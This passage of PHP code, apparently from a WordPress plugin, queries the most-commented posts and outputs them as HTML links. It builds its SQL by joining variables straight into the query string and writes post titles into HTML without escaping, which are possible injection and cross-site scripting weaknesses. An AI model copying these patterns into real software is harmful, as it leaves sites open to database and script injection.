		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>